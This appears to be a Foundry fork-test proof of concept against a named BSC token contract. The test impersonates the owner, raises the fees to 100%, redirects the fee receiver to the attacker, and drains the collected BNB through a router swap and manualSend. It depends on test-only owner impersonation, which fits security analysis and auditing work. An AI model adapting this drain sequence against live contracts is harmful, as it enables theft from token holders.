    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x05cd34a1D5dF5010F5eDb3412077B3c291DDb7a8;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use fork and impersonate
        // The test file already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the owner address
        address owner = Allin(TARGET).getOwner();

        // Step 2: Impersonate owner and enable trading
        vm.startPrank(owner);
        Allin(TARGET).tradingStatus(true);

        // Step 3: Set fees to maximum valid values (25% each, total 100%)
        Allin(TARGET).setFees(2500, 2500, 2500, 2500, 10000);

        // Step 4: Set marketingFeeReceiver to attacker address
        Allin(TARGET).setFeeReceivers(address(0xdead), attacker);
        vm.stopPrank();

        // Step 5: Record initial BNB balance of attacker
        uint256 initialBalance = attacker.balance;

        // Step 6: Buy tokens via router to generate fees
        // First, give attacker some BNB
        deal(attacker, 10 ether);

        // Get router address
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

        // Prepare swap path
        address[] memory path = new address[](2);
        path[0] = wbnb;
        path[1] = TARGET;

        // Perform swap: BNB -> WBNB -> Allin tokens
        // With 100% fees, most/all of the BNB should go to contract as fees
        vm.prank(attacker);
        IDEXRouter(routerAddress).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(
            0, // accept any amount
            path,
            attacker, // receive tokens here
            block.timestamp
        );

        // Step 7: Give it a moment for fees to accumulate
        vm.roll(block.number + 1);

        // Step 8: Impersonate owner to extract accumulated BNB
        vm.prank(owner);
        Allin(TARGET).manualSend();

        // Step 9: Verify attacker's BNB balance increased
        assertGt(attacker.balance, initialBalance, "Attacker BNB balance should increase");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

